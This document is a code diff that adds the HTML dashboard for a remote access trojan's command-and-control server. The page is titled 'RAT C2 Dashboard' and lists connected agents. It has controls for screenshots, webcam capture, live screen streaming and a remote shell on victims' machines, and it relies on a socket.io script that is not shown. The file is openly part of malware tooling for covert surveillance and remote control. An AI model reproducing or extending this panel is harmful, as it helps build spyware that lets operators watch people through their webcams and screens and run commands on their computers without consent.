@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RAT C2 Dashboard</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>🕵️ Remote Monitoring Dashboard</h1>
+      <span id="status">Disconnected</span>
+    </header>
+
+    <div class="main-layout">
+      <!-- Agent List -->
+      <aside class="sidebar">
+        <h2>Connected Agents</h2>
+        <div id="agent-list">
+          <p class="hint">Waiting for agents...</p>
+        </div>
+      </aside>
+
+      <!-- Monitoring Panel -->
+      <main class="monitor">
+        <div class="controls">
+          <select id="agent-select">
+            <option value="">— Select an agent —</option>
+          </select>
+          <button id="btn-screenshot" disabled>📸 Screenshot</button>
+          <button id="btn-webcam" disabled>📷 Webcam</button>
+          <button id="btn-stream" disabled>▶ Start Stream</button>
+          <button id="btn-cmd" disabled>💻 Shell</button>
+        </div>
+
+        <div class="viewports">
+          <div class="viewport" id="screen-view">
+            <div class="viewport-label">Screen</div>
+            <div class="screen-container">
+              <img id="screen-image" src="" alt="No feed" />
+              <div id="mouse-cursor" class="cursor-dot"></div>
+            </div>
+          </div>
+          <div class="viewport" id="webcam-view">
+            <div class="viewport-label">Webcam</div>
+            <img id="webcam-image" src="" alt="No feed" />
+          </div>
+        </div>
+
+        <div class="info-panel">
+          <h3>Agent Info</h3>
+          <pre id="agent-info">No agent selected</pre>
+        </div>
+      </main>
+    </div>
+  </div>
+
+  <!-- Command Modal -->
+  <div id="cmd-modal" class="modal hidden">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <h3>Remote Shell</h3>
+      <div id="cmd-output" class="cmd-output"></div>
+      <input type="text" id="cmd-input" placeholder="Type command..." />
+    </div>
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="dashboard.js"></script>
+</body>
+</html>
